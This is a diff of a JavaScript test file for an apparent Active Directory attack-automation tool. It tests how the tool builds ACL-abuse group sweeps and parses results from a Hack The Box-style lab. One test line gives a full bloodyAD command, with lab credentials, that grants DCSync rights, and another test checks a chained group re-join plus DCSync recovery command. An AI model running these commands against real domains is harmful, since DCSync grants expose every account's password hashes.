@@ -33,9 +33,19 @@ var sweep = OBOL.command.fillTemplate(sweepTmpl, facts, { params: { domain: 'cor
 ok(sweep.indexOf('{{') === -1, 'the sweep command fills with no leftover tokens');
 ok(/for g in "Exchange Windows Permissions"/.test(sweep), 'the sweep iterates the quoted candidate list');
 
-// no lead yet → the sweep still forms over the usual suspects rather than an empty loop
+// no lead yet → {{abuse_groups_quoted}} stays gated until get writable / BloodHound runs
 var empty = OBOL.command.buildContext(new OBOL.facts.FactSet([]), { params: { domain: 'corp.local' } });
-ok(/"Exchange Windows Permissions"/i.test(empty.abuse_groups_quoted) && /"Backup Operators"/i.test(empty.abuse_groups_quoted), 'with no lead, {{abuse_groups_quoted}} falls back to the standard high-value groups');
+ok(empty.abuse_groups_quoted === undefined, 'with no lead yet, {{abuse_groups_quoted}} stays gated until enumeration runs');
+
+// custom group lead → custom domain groups are included in both {{group}} and {{abuse_groups_quoted}}
+var customFacts = new OBOL.facts.FactSet([OBOL.facts.makeFact({ kind: 'ad.acl_lead', scope: 'domain:corp.local', value: { targets: ['IT Support', 'LAPS_Readers', 'EXCH01'] } })]);
+var customCtx = OBOL.command.buildContext(customFacts, { params: { domain: 'corp.local' } });
+ok(customCtx.group === 'IT Support' && /"IT Support"/.test(customCtx.abuse_groups_quoted) && /"LAPS_Readers"/.test(customCtx.abuse_groups_quoted) && customCtx.abuse_groups_quoted.indexOf('"EXCH01"') === -1, 'custom domain groups are included in {{group}} and {{abuse_groups_quoted}} while excluding computer accounts');
+
+// generic container lead → falls back to standard high-value groups once ad.acl_lead is held
+var genericFacts = new OBOL.facts.FactSet([OBOL.facts.makeFact({ kind: 'ad.acl_lead', scope: 'domain:corp.local', value: { targets: ['the domain object'] } })]);
+var genericCtx = OBOL.command.buildContext(genericFacts, { params: { domain: 'corp.local' } });
+ok(/"Exchange Windows Permissions"/i.test(genericCtx.abuse_groups_quoted) && /"Backup Operators"/i.test(genericCtx.abuse_groups_quoted), 'when ad.acl_lead holds a generic container target, {{abuse_groups_quoted}} falls back to standard high-value groups');
 
 // ---- evidence-driven join parsing: keep the wins, ignore the denials ----
 function joinedGroups(command, stdout) {
@@ -135,6 +145,19 @@ ok(denied.indexOf('blocker.acl_reauth') >= 0, 'a DENIED add-dcsync (insufficient
 var granted = kindsOf('bloodyAD -d htb.local --host 10.129.104.137 -u svc-alfresco -p s3rvice add dcsync svc-alfresco', '[+] svc-alfresco is now able to DCSync');
 ok(granted.indexOf('ad.control_paths') >= 0, 'a SUCCESSFUL add-dcsync still mints ad.control_paths');
 ok(granted.indexOf('blocker.acl_reauth') < 0, 'a successful grant does not falsely raise the re-auth blocker');
+
+// ---- {{joined_group}} & blocker.acl_reauth doctor: chained && recovery uses the group you actually joined ----
+load(path.join(__dirname, '..', '..', 'data', 'field-notes.js'));
+var postJoinFacts = new OBOL.facts.FactSet([
+  OBOL.facts.makeFact({ kind: 'ad.acl_lead', scope: 'domain:htb.local', value: { targets: ['Exchange Windows Permissions', 'Account Operators', 'DnsAdmins'] } }),
+  OBOL.facts.makeFact({ kind: 'ad.group_joined', scope: 'domain:htb.local', value: { group: 'Exchange Windows Permissions', user: 'svc-alfresco' } }),
+  OBOL.facts.makeFact({ kind: 'blocker.acl_reauth', scope: 'host:10.129.95.210', value: { tool: 'bloodyad' } }),
+]);
+var postJoinCtx = OBOL.command.buildContext(postJoinFacts, { params: { domain: 'htb.local', target: '10.129.95.210', user: 'svc-alfresco', password: 's3rvice' } });
+ok(String(postJoinCtx.group).toLowerCase() === 'account operators', '{{group}} advances past already-joined Exchange Windows Permissions to the next unjoined candidate');
+ok(String(postJoinCtx.joined_group).toLowerCase() === 'exchange windows permissions', '{{joined_group}} preserves Exchange Windows Permissions so the recovery doctor re-joins the group that was reverted');
+var reauthDoc = OBOL.FIELD_DOCTORS && OBOL.FIELD_DOCTORS['blocker.acl_reauth'];
+ok(!!(reauthDoc && reauthDoc.code && /add groupMember "<group>"/.test(reauthDoc.code) && /&&\s*bloodyAD.*add dcsync/.test(reauthDoc.code)), 'OBOL.FIELD_DOCTORS["blocker.acl_reauth"] provides a chained && recovery command');
 
 console.log(fail ? ('\nACL GROUP SWEEP: ' + fail + ' FAILURES') : '\nACL GROUP SWEEP: all passed');
 process.exit(fail ? 1 : 0);
